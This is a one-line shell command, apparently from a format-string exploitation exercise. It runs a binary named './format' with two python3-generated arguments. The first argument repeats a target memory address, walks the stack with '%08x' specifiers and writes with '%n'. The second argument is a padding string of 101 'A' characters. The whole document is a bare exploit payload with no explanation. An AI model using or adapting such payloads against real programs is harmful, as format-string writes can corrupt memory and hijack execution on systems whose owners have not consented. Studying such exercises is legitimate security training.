./format `python3 -c 'import sys; sys.stdout.buffer.write(b"\x2c\xa0\x04\x08"*250 + b"%08x.."*289 +b"%x%n")'` `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*101)'`
